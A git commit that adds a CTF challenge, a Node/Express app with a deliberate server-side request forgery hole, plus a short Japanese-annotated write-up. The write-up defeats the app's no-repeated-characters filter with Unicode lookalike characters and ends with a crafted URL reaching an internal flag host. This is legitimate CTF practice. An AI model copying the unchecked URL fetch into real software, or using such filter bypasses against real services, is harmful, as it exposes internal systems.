974f7d945238e9b7af68922502acad3c33fa55f7
Kohei Morita <mrtc0@ssrf.in>
2021-01-18 22:37:34 +0900

    bamboofox ctf 2020 ssrfrog

---
+++ ctf/bamboofox-2020/ssrfrog/app.js
@@ -0,0 +1,29 @@
+const express = require("express");
+const http = require("http");
+
+const app = express();
+
+app.get("/source", (req, res) => {
+    return res.sendFile(__filename);
+})
+app.get('/', (req, res) => {
+    const { url } = req.query;
+    console.log(url)
+    console.log(url.length)
+    console.log(new Set(url).size)
+    if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html");
+
+    // no duplicate characters in `url`
+    if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/no.html");
+
+    try {
+      console.log("OOOKKKKKKKKK")
+        http.get(url, resp => {
+            resp.setEncoding("utf-8");
+            resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":(");
+        }).on('error', () => res.send("WTF?"));
+    } catch (error) {
+        res.send("WTF?");
+    }
+});
+app.listen(3000, '0.0.0.0');
---
+++ ctf/bamboofox-2020/ssrfrog/writeup.md
@@ -0,0 +1,18 @@
+Original : http://the.c0o0o0l-fl444g.server.internal
+
+✔ 0 を 2 つ ⓪,０
+✔ o を 1 つ ℴ
+✔ 4 を 2 つ ⁴, ④
+✔ t を 3 つ T, Ⓣ, ｔ
+e を 2 つ Ⓔ, ｅ,
+n を 1 つ N
+r を 1 つ R
+/ を 1 つ \
+l を 2 つ L
+. を 2 つ 。．
+h を 1 つ
+
+http://the.c0o0o0l-fl444g.server.internal
+http://the.c0o0o0l-fl444g.server.internal
+
+htTp:\/Ⓣ ｈ Ⓔ。c0o ０ ℴ⓪L-f ｌ 4⁴④g．seRvEr.iN ｔｅｒ nal
